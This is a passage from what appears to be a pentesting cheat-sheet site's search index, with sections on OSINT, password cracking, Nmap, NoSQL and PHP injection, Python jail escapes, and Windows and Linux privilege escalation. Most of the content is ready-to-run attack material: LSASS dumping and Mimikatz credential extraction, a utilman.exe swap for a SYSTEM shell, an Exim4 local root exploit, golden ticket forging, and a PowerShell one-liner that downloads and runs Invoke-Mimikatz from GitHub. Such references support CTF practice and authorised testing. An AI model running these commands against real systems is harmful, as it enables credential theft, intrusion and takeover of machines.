COUNTRY] [-O CERT_ORG] [-I CERT_ISSUER] [-z CERT_HOST] [-S HTTP_SERVER] [-t HTML_TITLE] [-b HTML_BODY] [-T TAGS] [-L LIMIT] [-D] [-v] [-H] [arguments [arguments ...]] positional arguments: arguments Censys query optional arguments: -h --help, show this help message and exit -d DOMAIN, --domain DOMAIN, Domain to search. -s NAMESERVER, --server NAMESERVER, DNS server to use. -x PROXY, --proxy, PROXY Use a proxy server when retrieving results from search engines (eg. \u0026#39;-x http://127.0.0.1:8080\u0026#39;) -l LIMIT, --limit, LIMIT Limit the number of search engine results (default: 100). -i MODE, --info MODE Limit information gathering (basic,whois,dns,revdns,vhosts,google,bing,yahoo,ask,dogpile,yandex,censys,linkedin,twitter,googleplus,youtube,reddit,github,instagram,crt,pgp,netcraft,virustotal,dnsdump). -o BASENAME, --output BASENAME, Output in the four major formats at once (markdown, txt, xml and html). -k API-KEY, --shodan-key API-KEY API key to use with Shodan search (MODE=\u0026#34;shodan\u0026#34;) -m MATCH, --match MATCH, Highlight a string within an existing query result -f FILTER, --filter FILTER Filter the JSON keys to display for each result (use value \u0026#39;help\u0026#39; for interesting fields) --count, Print the count result and exit -R REPORT, --report REPORT, Stats on given field (use value \u0026#39;help\u0026#39; for listing interesting fields) -B REPORT_BUCKET, --report_bucket REPORT_BUCKET, Bucket length in report mode (default: 50) -1 CENSYS_API_ID, --censys_api_id CENSYS_API_ID, Provide the authentication ID for the censys.io search engine -2 CENSYS_API_SECRET, --censys_api_secret CENSYS_API_SECRET, Provide the secret hash for the censys.io search engine -r, --read_api_keys, Read the API Keys stored in api_keys.txt file. (e.g. \u0026#39;-i censys -r\u0026#39;) -u, --update_api_keys, Update the API Keys stored in api_keys.txt file. (e.g. \u0026#39;-i censys -u\u0026#39;) -a ASN, --asn ASN, Filter with ASN (e.g 5408 for GR-NET AS) -c COUNTRY, --country COUNTRY, Filter with country -O CERT_ORG, --cert-org CERT_ORG, Certificate issued to organization -I CERT_ISSUER, --cert-issuer CERT_ISSUER, Certificate issued by organization -z CERT_HOST, --cert-host CERT_HOST, hostname Certificate is issued to -S HTTP_SERVER, --http-server HTTP_SERVER, Server header -t HTML_TITLE, --html-title HTML_TITLE, Filter on html page title -b HTML_BODY, --html-body HTML_BODY, Filter on html body content -T TAGS, --tags TAGS, Filter on specific tags. e.g: -T tag1,tag2,... (use keyword \u0026#39;list\u0026#39; to list usual tags -L LIMIT, --Limit LIMIT, Limit to N results ( this is for censys.io ) -D, --debug, Debug informations -v, --verbose, Print raw JSON records -H, --html, Renders html elements in a browser \nUsage example # Specifiyng mode python gasmask.py -d example.com -i basic python gasmask.py -d example.com -i dnsdump python gasmask.py -d example.com -i shodan -k xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx python gasmask.py -d example.com -i whois,dns,revdns python gasmask.py -d example.com -i basic,yahoo,github -o myresults/example_com_search_results # Censys.io example python gasmask.py -i censys --Limit 10 nessus python gasmask.py -i censys -I SAP --report location.country.raw --report_bucket 10 python gasmask.py -i censys --html-title \u0026#34;Hacked By\u0026#34; --Limit 10 --html python gasmask.py -i censys --tags heartbleed --report location.country.raw python gasmask.py -i censys -S NGINX --count python gasmask.py -i censys -d example.com python gasmask.py -i censys -t \u0026#34;Internal Server Error\u0026#34; -S Apache -m \u0026#34;HTTP 500\u0026#34; --Limit 15"
},
{
	"uri": "/passcracking-hashfiles/john_cheatsheet/",
	"title": "John Cheatsheet",
	"tags": [],
	"description": "",
	"content": " Cracking Modes # Dictionnary attack ./john --wordlist=password.lst hashFile # Dictionnary attack using default or specific rules ./john --wordlist=password.lst --rules=rulename hashFile ./john --wordlist=password.lst --rules mypasswd # Incremental mode ./john --incremental hashFile # Loopback attack (password are taken from the potfile) ./john --loopback hashFile # Mask bruteforce attack ./john --mask=?1?1?1?1?1?1 --1=[A-Z] hashFile --min-len=8 # Dictionnary attack using masks ./john --wordlist=password.lst -mask=\u0026#39;?l?l?w?l\u0026#39; hashFile \nMISC \u0026amp; Tricks # Show hidden options ./john --list=hidden-options # Using session and restoring them ./john hashes --session=name ./john --restore=name ./john --session=allrules --wordlist=all.lst --rules mypasswd \u0026amp; ./john status # Show the potfile ./john hashes --pot=potFile --show # Search if a root/uid0 have been cracked john --show --users=0 mypasswdFile john --show --users=root mypasswdFile# List OpenCL devices and get their id ./john --list=opencl-devices # List format supported by OpenCL ./john --list=formats --format=opencl # Using multiples GPU ./john hashes --format:openclformat --wordlist:wordlist --rules:rules --dev=0,1 --fork=2 # Using multiple CPU (eg. 4 cores) ./john hashes --wordlist:wordlist --rules:rules --dev=2 --fork=4 \nWordlists \u0026amp; Incremental # Sort a wordlist for the wordlist mode tr A-Z a-z \u0026lt; SOURCE | sort -u \u0026gt; TARGET # Use a potfile to generate a new wordlist cut -d \u0026#39;:\u0026#39; -f 2 john.pot | sort -u pot.dic # Generate candidate password for slow hashes ./john --wordlist=password.lst --stdout --rules:Jumbo | ./unique -mem=25 wordlist.uniq--incremental:Lower # 26 char --incremental:Alpha # 52 char --incremental:Digits # 10 char --incremental:Alnum # 62 char # Create a new charset ./john --make-charset=charset.chr # Then set the following in the John.conf # Incremental modes [Incremental:charset] File = $JOHN/charset.chr MinLen = 0 MaxLen = 31 CharCount = 95 # Using a specific charset ./john --incremental:charset hashFile \nRules # Predefined rules --rules:Single --rules:Wordlist --rules:Extra --rules:Jumbo # All the above --rules:KoreLogic --rules:All # All the above# Create a new rule in John.conf [List.Rules:Tryout] l u ...| Rule | Description | |------------ |------------------------------------------------------- | | l | Convert to lowercase | | u | Convert to uppercase | | c | Capitalize | | l r | Lowercase the word and reverse it | | l Az\u0026#34;2015\u0026#34; | Lowercase the word and append \u0026#34;2015\u0026#34; at the end | | d | Duplicate | | l A0\u0026#34;2015\u0026#34; | Lowercase the word and append \u0026#34;2015\u0026#34; at the beginning | | A0\u0026#34;#\u0026#34;Az\u0026#34;#\u0026#34; | Add \u0026#34;#\u0026#34; at the beginning and the end of the word | | C | Lowercase the first char and uppercase the rest | | t | Toggle case of all char | | TN | Toggle the case of the char in position N | | r | Reverse the word | | f | Reflect (Fred --\u0026gt; Fredderf) | | { | Rotate the word left | | } | Rotate the word right | | $x | Append char X to the word | | ^x | Prefix the word with X char | | [ | Remove the first char from the word | | ] | Remove the last char from the word | | DN | Delete the char in position N | | xNM | Extract substring from position N for M char | | iNX | Insert char X in position N and shift the rest right | | oNX | Overstrike char in position N with X | | S | Shift case | | V | Lowercase vowels and uppercase consonants | | R | Shift each char right on the keyboard | | L | Shift each char left on the keyboard | | \u0026lt;N | Reject the word unless it is less than N char long | | \u0026gt;N | Reject the word unless it is greater than N char long | | \\\u0026#39;N | Truncate the word at length N |"
},
{
	"uri": "/network/ldap_dns/",
	"title": "LDAP &amp; DNS",
	"tags": [],
	"description": "",
	"content": " LDAP Null Bind Enumeration # Syntax ldapsearch -h \u0026#34;LENOMDELAMACHINELDAP\u0026#34; -p \u0026#34;LEPORTSURLEQUELONYACCEDE\u0026#34; -x -b \u0026#34;ou=UNE_OU_EXISTANTE,DC=QUIVABIEN,DC=SUITE,DC=FOO\u0026#34; -v # Classic research ldapsearch -h challenge01.root-me.org -p 54013 -x -b \u0026#34;ou=anonymous,dc=challenge01,dc=root-me,dc=org\u0026#34; \u0026#34;cn=*\u0026#34; \nDNS Zone Transfer # Zone transfer using dig dig @challenge01.root-me.org -p 54011 AXFR ch11.challenge01.root-me.org. # Zone transfer using nslookup nslookup -type=any \u0026gt; set port \u0026lt;port\u0026gt; \u0026gt; server challenge01.root-me.org \u0026gt; ch11.challenge01.root-me.org# Custom PERL zone transfer #!/usr/bin/env perl use warnings; use strict; use Net::DNS; # ici je teste rapidement si j\u0026#39;ai bien installe le module Net::DNS print Net::DNS-\u0026gt;version, \u0026#34;\\n\u0026#34;; # creation de l\u0026#39;instance du resolveur maison.  # on lui indique le dns sur lequel nous allons agir # comme explique dans la description du challenge # nous indiquons aussi que nous voulons avoir des infos  # de deboggage et sans recursion. my $monResolveur = Net::DNS::Resolver-\u0026gt;new( nameservers =\u0026gt; [qw(challenge01.root-me.org)], recurse =\u0026gt; 0, debug =\u0026gt; 1, port =\u0026gt; 54011); # test du transfert de zone avec les infos exposees dans # l\u0026#39;enonce. my @maZone = $monResolveur-\u0026gt;axfr(\u0026#34;ch11.challenge01.root-me.org\u0026#34;); # si tout s\u0026#39;est bien deroule, on affiche les valeurs attendues comme avec dig ou host. if (@maZone) { foreach my $rr (@maZone) { $rr-\u0026gt;print; } }"
},
{
	"uri": "/windows-systems/privilege-escalation/lsass_mimikatz/",
	"title": "LSASS and Mimikatz",
	"tags": [],
	"description": "",
	"content": " LSASS # Avoiding running Mimikatz on the target can be a nice solution for stealth # You can just dump the LSASS process, get them and parse it locally procdump.exe -accepteula -ma lsass.exe lsass.dmp \nMimikatz # If you have an LSASS dump, you can use the minidump module mimikatz # sekurlsa::minidump lsass.DMP mimikatz # sekurlsa::logonPasswords /full # You can upload mimikatz to a remote machine with smbclient # Or you can use crackmapexec # Executon may fail but the binary will be uploaded in C:\\\\Windows\\\\mimikatz.exe crackmapexec IP -u user -p password -M mimikatz # Then you can execute remotely through winexe winexe -U admin%password //IP C:\\\\Windows\\\\mimikatz.exe # Password dumping mimikatz # privilege::debug mimikatz # sekurlsa::logonPasswords /full"
},
{
	"uri": "/windows-systems/local-and-physical/",
	"title": "Local and Physical",
	"tags": [],
	"description": "",
	"content": " Table of Content  Network and Domain Recon  Out of domain (no credentials) Domain Recon Domain Mapping  Local and Physical  Local Recon Enumeration Physical Access  Exploitation  Exploitation Tricks CrackMapExec Impacket Kerberos RDP Exploitation File Transfer  Privilege Escalation  Admin and Processes LSASS and Mimikatz Windows Defender Tricks  Post Exploitation  NTDS Database Silver and Golden Tickets DC Shadow   "
},
{
	"uri": "/recon-enumeration/port-scanning/nmap_cheatsheet/",
	"title": "Nmap Cheatsheet",
	"tags": [],
	"description": "",
	"content": " https://github.com/Tib3rius/AutoRecon Full commands examples # Ping scan nmap -sP 192.168.0.0/24 # Quick scan nmap -T4 -F 192.168.1.1 -vvv # Quick scan plus (more info but more aggressive) nmap -sV -T4 -O -F –version-light 192.168.1.1 -vvv # TCP Syn and UDP Scan (requires root) nmap -sS -sU -PN -p T:80,T:445,U:161 192.168.1.1 # Soft nmap nmap -v -Pn -n -T4 -sT -sV --version-intensity=5 --reason 192.168.1.1 # Full nmap nmap -v -Pn -n -T4 -sT -p- --reason 192.168.1.1 # Dedicated nmap nmap -v -Pn -n -T4 -sV --version-intensity=5 -sT -p T:ports_found --reason \u0026lt;IP\u0026gt; \nTarget specification nmap 192.168.1.1 nmap 192.168.1.1-10 nmap 192.168.1.0/24 nmap google.com nmap 192.168.1.0/24 --exclude192.168.1.1 nmap -iL targets.txt \nScan techniques # TCP SYN port scan (default, root needed) nmap -sS 192.168.1.1 # TCP CONNECT port scan (default without root privilege) # Require full connection so it is slower nmap -sT 192.168.1.1 # UDP port scan nmap -sU 192.168.1.1 nmap -sA 192.168.1.1 nmap -sW 192.168.1.1 nmap -sN 192.168.1.1 # Ping scan nmap -sP 192.168.0.0/24 \nHost discovery # No scan, only list targets (get hostnames) nmap -sL 192.168.1.1 # Disable port scanning, only host discovery nmap -sn 192.168.1.1 # Disable host discovery, only port scanning, can be usefull if firewall deny PING nmap -Pn 192.168.1.1 # Disable DNS resolution nmap 192.168.1.1 -n \nServices, ports and OS (fingerprinting nmap -p 20 192.168.1.1 nmap -p 20-100 192.168.1.1 nmap -p U:53,T:25-100 192.168.1.1 nmap -p http,https 192.168.1.1 # All ports nmap -p- 192.168.1.1 # Fast port scan (100 more common ports) nmap 192.168.1.1 -F # Top X ports nmap 192.168.1.1 --top-ports 2000 # Try to get service version nmap 192.168.1.1 -sV # 0-9 nmap 192.168.1.1 -sV --version-intensity 3 # Light mode but faster nmap 192.168.1.1 -sV --version-light # Equivalent to version-intensity 9. Harder nmap 192.168.1.1 -sV --version-all # Aggressive mode (OS Detection, version, script, traceroute) nmap 192.168.1.1 -A # OS Detection using TCP/IP nmap 192.168.1.1 -O # Disable OS dection if at least one open and one closed port are not found nmap 192.168.1.1 -O --osscan-limit # OS Scan guess more aggressive nmap 192.168.1.1 -O --osscan-guess # Set the maximum number x of OS detection tries against a target nmap 192.168.1.1 -O --max-os-tries 2 \nNSE Scripts # Default script scanning, considered safe nmap 192.168.1.1 -sC nmap 192.168.1.1 --script default nmap 192.168.1.1 --script=xxx nmap 192.168.1.1 --script=xxx --script-args xx=xx # Scan default, but remove intrusive scripts nmap 192.168.1.1 --script “not intrusive\u0026#34; \nMISC # Scan speed # T0-T1 : Slow (useful for Intrusion Detection Systems evasion) # T2-T3 : Normal # T4-T5 : Agressive (Need a realiable and strong network) nmap 192.168.1.1 -T0 nmap 192.168.1.1 --host-timeout 10s # Delay between probes nmap 192.168.1.1 --scan-delay 1s nmap 192.168.1.1 --max-scan-delay 2s nmap 192.168.1.1 --max-retries 3 # No faster or no slower than 100 packets/second nmap 192.168.1.1 --min-rate 100 nmap 192.168.1.1 --max-rate 100 \nEvading IDS # Tiny fragmented packets nmap 192.168.1.1 -f # Set your own offset size nmap 192.168.1.1 -mtu 32 # Scan from spoofed IP nmap 192.168.1.1 -D 192.168.1.2 # Scan Facebook from Microsoft nmap -S www.microsoft.com www.facebook.com # Use a specific source port nmap 192.168.1.1 -g 53 # Proxy nmap 192.168.1.1 --proxies http://X.X.X.X:8080 # Append random data to sent packets nmap 192.168.1.1 --data-length 200 \nOutput # Save result (oN=normal oX=xml oG=grepable oA=all) nmap 192.168.1.1 -oN scanResult.file # Verbosity level (one v or more) and debugging level nmap 192.168.1.1 -vvvvvv nmap 192.168.1.1 -ddd # Reason for the port state (equivalent to -vv) nmap 192.168.1.1 --reason # Show only open ports nmap 192.168.1.1 --open # Show all packets sent and received nmap 192.168.1.1 --packets-trace # Show the host interface and routes nmap 192.168.1.1 --iflist # Resume a scan nmap --resume scan.file nmap 192.168.1.1 -vvvvvv nmap 192.168.1.1 -vvvvvv"
},
{
	"uri": "/web-attacks/server-side-injections/nosql/",
	"title": "NoSQL Injections",
	"tags": [],
	"description": "",
	"content": " Basic Authentication index.php?login[$regex]=a.*\u0026amp;pass[$ne]=lol index.php?login[$gt]=admin\u0026amp;login[$lt]=test\u0026amp;pass[$ne]=1 # Basic NoSQL Injection http://url?login[$nin][]=admin\u0026amp;login[$nin][]=test\u0026amp;pass[$ne]=toto \nBlind NoSQL Injection # Get size index.php ?chall_name=nosqlblind\u0026amp;flag[$regex]=.1 # Enumeration index.php ?chall_name=nosqlblind\u0026amp;flag[$regex]=3a.20"
},
{
	"uri": "/web-attacks/php-vulnerabilities/functions/",
	"title": "PHP Functions",
	"tags": [],
	"description": "",
	"content": " Assert() # The assert() function will execute code in params # Example using root-me challenge ?page=.. Warning : assert() : Assertion \u0026#34;strpos(’includes/...php’, ’..’) === false\u0026#34; failed in path/index.php on line 8 # The request looks like this assert(\u0026#34;strpos(\u0026#39;includes/\u0026#39; . $_GET[\u0026#39;page\u0026#39;] . \u0026#39;.php\u0026#39;, \u0026#39;..\u0026#39;) === false\u0026#34;) # If we inject this ?page=salade.php\u0026#39;,\u0026#39;..\u0026#39;) || print(\u0026#39;tomate\u0026#39;) || strpos(\u0026#39;oignons # The request will look like assert(\u0026#34;strpos(\u0026#39;/includes/salade.php\u0026#39;,\u0026#39;..\u0026#39;) || print(\u0026#39;tomate\u0026#39;) || strpos(\u0026#39;oignons.php\u0026#39;,\u0026#39;..\u0026#39;) ===false\u0026#34;) # Then, to exploit ?page=salade.php\u0026#39;,\u0026#39;..\u0026#39;) || show_source(\u0026#39;.passwd\u0026#39;) || strpos(\u0026#39;oignons \nPHP preg_replace() # In PHP, regular expressions need delimiter preg_match(\u0026#34;recherche\u0026#34;,\u0026#34;contenu\u0026#34;); # wrong preg_match(\u0026#34;/recherche/\u0026#34;,\u0026#34;contenu\u0026#34;); # OK # preg_replace offers an option to execute code preg_replace(\u0026#34;input1search\u0026#34;,\u0026#34;input2replace\u0026#34;,\u0026#34;input3content\u0026#34;); preg_replace(\u0026#34;/a/e\u0026#34;,\u0026#34;print(123)\u0026#34;,\u0026#34;abcd\u0026#34;); preg_replace(\u0026#34;/a/e\u0026#34;,\u0026#34;print_r(scandir(\u0026#39;.\u0026#39;))\u0026#34;,\u0026#34;abcd\u0026#34;); preg_replace(\u0026#34;/a/e\u0026#34;,\u0026#34;file_get_contents(\u0026#39;flag.php\u0026#39;)\u0026#34;,\u0026#34;abcd\u0026#34;); \nPHP preg_match() # It is possible to bypass some functions like preg_match by injecting non-alphanumeric char # If the application uses eval() on the user input, the payload will still be executed # Application code if(!preg_match(\u0026#39;/[a-zA-Z`]/\u0026#39;, $_POST[\u0026#39;input\u0026#39;])){ print \u0026#39;\u0026lt;fieldset\u0026gt;\u0026lt;legend\u0026gt;Result\u0026lt;/legend\u0026gt;\u0026#39;; eval(\u0026#39;print \u0026#39;.$_POST[\u0026#39;input\u0026#39;].\u0026#34;;\u0026#34;); print \u0026#39;\u0026lt;/fieldset\u0026gt;\u0026#39;; } # Exploitation and Bypass # You can encode the payload in octal → file_get_contents(\u0026#34;.passwd\u0026#34;) → \u0026#34;\\146\\151\\154\\145\\137\\147\\145\\164\\137\\143\\157\\156\\164\\145\\156\\164\\163\u0026#34;(\u0026#34;\\056\\160\\141\\163\\163\\167\\144\u0026#34;) # You can also use non alphanumeric char (https://github.com/v1ll41n/Und3rCov3r) echo -n “phpinfo();” \u0026gt; tmp.php php Und3rCov3r.ph 1 tmp.php # If will create an alphax.php file containing the encoded payloadu0026#39;$_=\u0026#34;\u0026#39;.$___.$______.$___________.$______________.$___.$______.$__________.$______________.$___.$______.$___________.$______________.$___.$______.$__________.$______.$___.$______.$__________.$___________.$___.$______.$_________.$___________.$___.$______.$__________.$____________.$___.$__________.$______________.$___.$__________.$______.$___.$____________.$________.\u0026#39;\u0026#34;\u0026#39;);$__($_); # You can then for example read file → readfile(\u0026#34;.passwd\u0026#34;); $_[]++;$_[]=$_._;$_____=$_[(++$__[])][(++$__[])+(++$__[])+(++$__[])];$_=$_[$_[+_]];$___=$__=$_[++$__[]];$____=$_=$_[+_];$_++;$_++;$_++;$_=$____.++$___.$___.++$_.$__.++$___;$__=$_;$_=$_____;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$___=+_;$___.=$__;$___=++$_^$___[+_];$______________=+_;$______++;$_______++;$_______++;$________++;$________++;$________++;$_________++;$_________++;$_________++;$_________++;$__________++;$__________++;$__________++;$__________++;$__________++;$___________++;$___________++;$___________++;$___________++;$___________++;$___________++;$____________++;$____________++;$____________++;$____________++;$____________++;$____________++;$____________++;$_____________++;$_____________++;$_____________++;$_____________++;$_____________++;$_____________++;$_____________++;$_____________++; $__(\u0026#39;$_=\u0026#34;\uu0026#39;\u0026#34;\u0026#39;);$__($_);"
},
{
	"uri": "/windows-systems/local-and-physical/physical_access/",
	"title": "Physical Access",
	"tags": [],
	"description": "",
	"content": " Live boot from Kali # - USB Live Kali # - Mount the Windows system disk # - Get SAM and SYSTEM files from \u0026#34;C:\\Windows\\System32\\config\\\u0026#34; # - Extract hashes → samdump2 SYSTEM SAM \u0026gt; hash.txt # - Crack hashes using JTR (john -format=NT hash.txt) or Hashcat # - You may have to use “bkhive\u0026#34; on the SYSTEM file first # - John format can also be NT2 \nUtilman.exe attack # You can access a SYSTEM cmd shell if you have access to the filesystem # utilman.exe can be run BEFORE login by \u0026#34;WinKey + U\u0026#34; # If you can access filesystem and change utilman.exe by a cmd.exe, SYSTEM shell will be run. # Access can be done by live bootable key (Linux, Windows..) # From a Windows 10 bootable key -\u0026gt; SHIFT + F10 to access filesystem move d:\\windows\\system32\\utilman.exe d:\\windows\\system32\\utilman.exe.bak copy d:\\windows\\system32\\cmd.exe d:\\windows\\system32\\utilman.exe # OR C:\\ cd windows\\system32 ren utilman.exe utilman.exe.bak copy cmd.exe utilman.exe # Then on the logon screen --\u0026gt; WinKey + U # And then net user NewGuy abc123 /add net localgroup Administrators NewGuy /add# Reverting # To restore utilman.exe, in the Command Prompt type in: C: cd windows\\system32 del utilman.exe ren utilman.exe.bak utilman.exe"
},
{
	"uri": "/recon-enumeration/port-scanning/",
	"title": "Ports Scanning",
	"tags": [],
	"description": "",
	"content": " Table of Content  Application Scans Ports Scanning Services enumeration  "
},
{
	"uri": "/linux-systems/programing-languages/python/",
	"title": "Python",
	"tags": [],
	"description": "",
	"content": " Input() exploitation # In Python2, input function is vulnerable # input(x) = eval(raw_input(x)) # Means that user inputs will be executed # You can exec code Please enter password : sys.stdout.write(open(\u0026#34;.passwd\u0026#34;).readline()) 13373439872909134298363103573901 # Another Please enter password : __import__(\u0026#39;os\u0026#39;).system(\u0026#39;cat /challenge/shell/shell6/.passwd \u0026gt; /tmp/flag\u0026#39;) cat /tmp/flag # Another Please enter password : __import__(\u0026#39;shutil\u0026#39;).copyfile(\u0026#39;/challenge/shell/shell6/.passwd\u0026#39;, \u0026#39;/tmp/flag2\u0026#39;) # You can even get a shell Please enter password : __import__(\u0026#39;os\u0026#39;).system(\u0026#39;sh\u0026#39;) # Another Please enter password : input(open(\u0026#34;.passwd\u0026#34;).readline()) # Another Please enter password : __builtins__.__dict__[\u0026#39;print\u0026#39;](__builtins__.__dict__[\u0026#39;open\u0026#39;](\u0026#39;.passwd\u0026#39;, \u0026#39;r\u0026#39;).read()) \nPyjail - Only print and no quotes # Exploration exit / exit() / exit(1) / exit(\u0026#39;a\u0026#39;) # Try to assign variable, use import # Only exit is interesting # You can brutefore argument or try to get information about the code # You can try locally def test( flag_input ): if flag_input == 12345: print \u0026#34;Success!\u0026#34; else: print \u0026#34;Failure !\u0026#34; return 1 print dir(test) [\u0026#39;__call__\u0026#39;, \u0026#39;__class__\u0026#39;, \u0026#39;__closure__\u0026#39;, \u0026#39;__code__\u0026#39;, \u0026#39;__defaults__\u0026#39;, \u0026#39;__delattr__\u0026#39;, \u0026#39;__dict__\u0026#39;, \u0026#39;__doc__\u0026#39;, \u0026#39;__format__\u0026#39;, \u0026#39;__get__\u0026#39;, \u0026#39;__getattribute__\u0026#39;, \u0026#39;__globals__\u0026#39;, \u0026#39;__hash__\u0026#39;, \u0026#39;__init__\u0026#39;, \u0026#39;__module__\u0026#39;, \u0026#39;__name__\u0026#39;, \u0026#39;__new__\u0026#39;, \u0026#39;__reduce__\u0026#39;, \u0026#39;__reduce_ex__\u0026#39;, \u0026#39;__repr__\u0026#39;, \u0026#39;__setattr__\u0026#39;, \u0026#39;__sizeof__\u0026#39;, \u0026#39;__str__\u0026#39;, \u0026#39;__subclasshook__\u0026#39;, \u0026#39;func_closure\u0026#39;, \u0026#39;func_code\u0026#39;, \u0026#39;func_defaults\u0026#39;, \u0026#39;func_dict\u0026#39;, \u0026#39;func_doc\u0026#39;, \u0026#39;func_globals\u0026#39;, \u0026#39;func_name\u0026#39;] # So you can use it like this print exit.func_code # Same code again.. And.. print exit.func_code.co_consts # You can see the interesting variable and use it like this exit(exit.func_code.co_consts[1]) \nPyjail - No dots, quotes and some restricted functions # dir() is doing a return. You can see it if it\u0026#39;s executed in the same environment # When it goes through an eval(), the return remains in this environment, so you need to print it print dir() print dir(getout) print dir(getout)[29] # No dots, but you can access the __globals___ object using getattr() # dir() will give you the others objects accessible print dir(getattr(getout, dir(getout)[11])) # getattr() in that case will give you the content of that __globals__ print getattr(getout, dir(getout)[11]) # Then, if there is a dictionnary you can access keys and values, in a loop for example Keys -- for k in getattr(getout, dir(getout)[11]):print k Values -- for k in getattr(getout, dir(getout)[11]):print getattr(getout, dir(getout)[11])[k] Flag -- for k in getattr(getout, dir(getout)[11]):getout(getattr(getout, dir(getout)[11])[k]) # You can also use values() print dir(dict)[42] print getattr(getattr(getout, dir(getout)[29]),dir(dict)[42]) print getattr(getattr(getout, dir(getout)[29]),dir(dict)[42])() print getattr(getattr(getout, dir(getout)[29]),dir(dict)[42])()[7] getout(getattr(getattr(getout, dir(getout)[29]),dir(dict)[42])()[7]) # You can transform dictionary to list and then just access it print(list(getattr(getout, dir(getout)[-2]))) print(getattr(getout, dir(getout)[-2])[list(getattr(getout, dir(getout)[-2]))[7]]) getout(getattr(getout, dir(getout)[-2])[list(getattr(getout, dir(getout)[-2]))[7]]) # You can also change the password value to avoid string restrictions getattr(getout,dir(getout)[11])[list(getattr(getout,dir(getout)[11]))[7]]=1234 print getattr(getout,dir(getout)[11])[list(getattr(getout,dir(getout)[11]))[7]] getout(1234) # You can recreate dot using bytes bytes(round(1/3))[1]) # And then use the \u0026#34;command\u0026#34; function to grab “passw” and “d” to get the correct string back bytes(command[-7:-2] + command[-1]) (bytes(round(1/3))[1] + command[-7:-2] + command[-1]) print(next(open(bytes(round(1/3))[1] + command[-7:-2] + command[-1]))) \nPyjail - Generate a shell # Trough help and a w3m console help() help\u0026gt; modules help\u0026gt; antigravity @ → /bin/sh /bin/sh 1\u0026gt;\u0026amp;2 reset cat .passwd"
},
{
	"uri": "/recon-enumeration/",
	"title": "Recon - Enumeration",
	"tags": [],
	"description": "",
	"content": " Table of Content  Application Scans Ports Scanning Services enumeration  "
},
{
	"uri": "/windows-systems/exploitation/remote_execution_techniques/",
	"title": "Remote Execution Techniques",
	"tags": [],
	"description": "",
	"content": " Impacket tools https://www.secureauth.com/labs/open-source-tools/impacket# psexec # PSEXEC like functionality example using RemComSvc(https://github.com/kavika13/RemCom). psexec.py domain/user:password@IP \u0026lt;command\u0026gt;# smbexec # A similar approach to PSEXEC w/o using RemComSvc. The technique is described here. # Instantiating a local smbserver to receive the output of the commands. # This is useful in the situation where the target machine does NOT have a writeable share available. smbexec.py domain/user:password@IP \u0026lt;command\u0026gt;# atexec # This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command. atexec.py domain/user:password@IP \u0026lt;command\u0026gt;# wmiexec # A semi-interactive shell, used through Windows Management Instrumentation. # It does not require to install any service/agent at the target server. Runs as Administrator. Highly stealthy. wmiexec.py domain/user:password@IP \u0026lt;command\u0026gt;# dcomexec # A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints. ## Currently supports MMC20.Application, ShellWindows and ShellBrowserWindow objects. dcomexec.py domain/user:password@IP \u0026lt;command\u0026gt;"
},
{
	"uri": "/linux-systems/privilege-escalation/services/",
	"title": "Services",
	"tags": [],
	"description": "",
	"content": " Exim4 # https://www.exploit-db.com/exploits/39535 #!/bin/sh echo [ CVE-2016-1531 local root exploit cat \u0026gt; /tmp/root.pm \u0026lt;\u0026lt; EOF package root; use strict; use warnings; system(\u0026#34;/bin/sh\u0026#34;); EOF PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps \nMySQL # If MySQL is running as root, you can run commands sys_exec(\u0026#39;usermod -a -G admin username\u0026#39;) Select sys_exec(\u0026#39;whoami\u0026#39;); select sys_exec(\u0026#39;/bin/bash\u0026#39;); Select sys_eval(\u0026#39;whoami\u0026#39;); # MySQL run as root and version is \u0026lt;5 go for User Defined Functions (UDF) # TODO"
},
{
	"uri": "/windows-systems/post-exploitation-techniques/silver_golden_tickets/",
	"title": "Silver and Golden Tickets",
	"tags": [],
	"description": "",
	"content": " Ticket generation from Linux # Generate a ticket or convert it (kekeo) to ccache format $ ticketer.py -nthash \u0026lt;hash\u0026gt; -domain-sid \u0026lt;sid\u0026gt; -domain \u0026lt;domain\u0026gt; \u0026lt;user\u0026gt; # Export the path in the right variable $ export KRB5CCNAME=/tmp/ticket.ccache $ klist # Exec and use the ticket $ /impacket/examples/psexec.py -k -n -debug DOMAIN/user@host # Dump NTDS $ proxychains secretsdump.py -k -no-pass qsec@DCFIL.PRAMAFIL.CORP -use-vss \nGolden Ticket # Golden Ticket \u0026gt; Nom du compte administrateur (Administrateur) \u0026gt; Nom complet du domaine (domain.local) \u0026gt; SID du domaine (S-1-5-21-1723555596-1415287819-2705645101) [whoami /user] \u0026gt; Hash NTLM du compte krbtgt (6194bd1a5bf3ecd542e8aac9860bddf0) mimikatz # privilege:debug mimikatz # lsadump::lsa /inject /name:krbtgt mimikatz # kerberos::golden /admin:Administrateur /domain:domain.local /sid:S-1-5-21-1723555596-1415287819-2705645101 /krbtgt:6194bd1a5bf3ecd542e8aac9860bddf0 /ticket:domain.local.kirbi /id:500 /ptt Use : mimikatz # kerberos::ptt domain.local.kirbi mimikatz # kerberos::list \nPlaying with tickets on Windows # Sessions en cours mimikatz # sekurlsa::logonpasswords # Ticket TGT # Dump SPN PS C:\\\u0026gt; Find-PSServiceAccounts -DumpSPN Discovering service account SPNs in the AD Domain foo.local svcSQLServ/pc1.foo.local:1433 # Download Mimikatz PS C:\\\u0026gt; Invoke-Expression (New-Object Net.Webclient).downloadstring(\u0026#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1\u0026#39;) PS C:\\\u0026gt; Invoke-Mimikatz mimikatz(powershell) # sekurlsa::logonpasswords ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005) # Lister les tickets actifs ou les purger PS C:\\\u0026gt; Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::purge\u0026#34;\u0026#39; PS C:\\\u0026gt; Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::list\u0026#34;\u0026#39; PS C:\\\u0026gt; klist # Demander un ticket PS C:\\\u0026gt; Add-Type -AssemblyName System.IdentityModel PS C:\\\u0026gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \u0026#34;svcSQLServ/pc1.foo.local:1433\u0026#34; # Exporter un ticket mimikatz # kerberos::list /export # Crack Ticket python tgsrepcrack.py wordlist.txt 